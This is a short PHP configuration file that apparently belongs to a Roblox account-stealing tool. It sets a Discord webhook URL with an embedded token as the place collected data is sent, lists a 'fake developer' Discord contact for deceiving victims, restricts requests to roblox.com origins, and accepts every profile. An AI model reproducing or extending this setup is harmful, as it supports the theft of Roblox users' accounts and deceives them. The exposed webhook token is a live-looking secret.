<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/887120646906208346/2Xtg-ymqeawAtA4shoHSsDWeXlEWsa2THcOEEBLC1ZAcMw4Vy8spwJYfIeDBWzi_zhS2";
    // fake developer for the bot the users may contact
    $discord_contact = "TeeScrap#1474";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>
